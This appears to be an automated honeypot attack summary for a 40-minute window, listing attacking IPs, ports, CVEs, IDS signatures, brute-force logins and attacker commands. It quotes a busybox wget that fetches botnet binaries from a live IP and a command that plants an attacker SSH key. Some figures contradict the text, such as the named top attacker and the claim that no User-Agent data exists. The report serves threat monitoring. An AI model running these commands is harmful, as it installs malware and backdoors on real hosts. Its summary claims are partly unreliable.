Honeypot Attack Summary Report

**Report Generation Time:** 2025-09-30T11:01:27Z
**Timeframe:** 2025-09-30T10:20:01Z to 2025-09-30T11:00:01Z
**Files Used:**
- agg_log_20250930T102001Z.json
- agg_log_20250930T104001Z.json
- agg_log_20250930T110001Z.json

**Executive Summary**

This report summarizes 10,208 attacks recorded by honeypot sensors over a 40-minute period. The majority of attacks were detected by the Suricata, Cowrie, and Honeytrap honeypots. The most frequent attacks originated from IP address 196.202.4.136 and targeted TCP port 445. Several CVEs were exploited, and a variety of malicious commands were attempted.

**Detailed Analysis**

***Attacks by Honeypot***

*   Cowrie: 3488
*   Suricata: 2561
*   Honeytrap: 2394
*   Ciscoasa: 1449
*   Sentrypeer: 63
*   Mailoney: 55
*   H0neytr4p: 46
*   Heralding: 33
*   Redishoneypot: 32
*   Dionaea: 18
*   ConPot: 15
*   ElasticPot: 17
*   Tanner: 18
*   Adbhoney: 14
*   Dicompot: 3
*   Honeyaml: 1
*   Ipphoney: 1

***Top Attacking IPs***

*   196.202.4.136: 1299
*   209.38.21.236: 1499
*   14.103.239.174: 1007
*   185.156.73.167: 366
*   185.156.73.166: 367
*   92.63.197.55: 362
*   92.63.197.59: 337
*   201.76.120.30: 249
*   14.103.41.249: 179

***Top Targeted Ports/Protocols***

*   TCP/445: 1294
*   22: 590
*   6000: 200
*   8333: 129
*   23: 52
*   5060: 63
*   443: 37
*   TCP/22: 52
*   6379: 29
*   25: 55

***Most Common CVEs***

*   CVE-2002-0013 CVE-2002-0012: 12
*   CVE-2002-0013 CVE-2002-0012 CVE-1999-0517: 9
*   CVE-2021-3449 CVE-2021-3449: 5
*   CVE-2019-11500 CVE-2019-11500: 4
*   CVE-2024-3721 CVE-2024-3721: 1

***Commands Attempted by Attackers***

*   `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...`: 4
*   `cd ~; chattr -ia .ssh; lockr -ia .ssh`: 2
*   `lockr -ia .ssh`: 2
*   `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ... mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~`: 2
*   `cat /proc/cpuinfo | grep name | wc -l`: 2
*   `Enter new UNIX password: `: 2
*   `Enter new UNIX password:`: 2
*   `uname -s -v -n -r -m`: 2

***Signatures Triggered***

*   ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication: 1292
*   ET DROP Dshield Block Listed Source group 1: 359
*   ET SCAN NMAP -sS window 1024: 213
*   ET INFO Reserved Internal IP Traffic: 57
*   ET SCAN Potential SSH Scan: 37
*   ET INFO VNC Authentication Failure: 27
*   ET SCAN MS Terminal Server Traffic on Non-standard Port: 26

***Users / Login Attempts***

*   superadmin/admin123: 3
*   traquan/traquan: 2
*   user/factory@123: 2
*   zabbix/zabbix: 2
*   docker/docker123: 2
*   GET / HTTP/1.1/Host: 3.253.97.195:23: 2
*   anonymous/: 2

***Files Uploaded/Downloaded***

*   arm.urbotnetisass: 4
*   arm5.urbotnetisass: 4
*   arm6.urbotnetisass: 4
*   arm7.urbotnetisass: 4
*   x86_32.urbotnetisass: 4
*   mips.urbotnetisass: 4
*   mipsel.urbotnetisass: 4
*   fonts.gstatic.com: 1
*   html5.js?ver=3.7.3: 1

***HTTP User-Agents***
*   `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36`: 2

***SSH Clients and Servers***

*   No SSH clients or servers were recorded in this period.

***Top Attacker AS Organizations***

*   No attacker AS organizations were recorded in this period.

**Key Observations and Anomalies**

*   A significant amount of traffic was directed towards TCP port 445, suggesting continued interest in exploiting SMB vulnerabilities. The "DoublePulsar Backdoor" signature reinforces this observation.
*   The repeated download and execution of `urbotnetisass` payloads from the same IP address (94.154.35.154) across multiple honeypots indicates a coordinated and automated attack campaign.
*   Attackers attempted to modify SSH authorized_keys, indicating attempts to establish persistent access.
*   A variety of generic usernames and passwords were used, which is typical of brute-force attacks.
*   The lack of data for HTTP User-Agents, SSH clients/servers, and AS organizations might indicate that the attacks were primarily focused on lower-level protocols or that the honeypots did not capture this information.
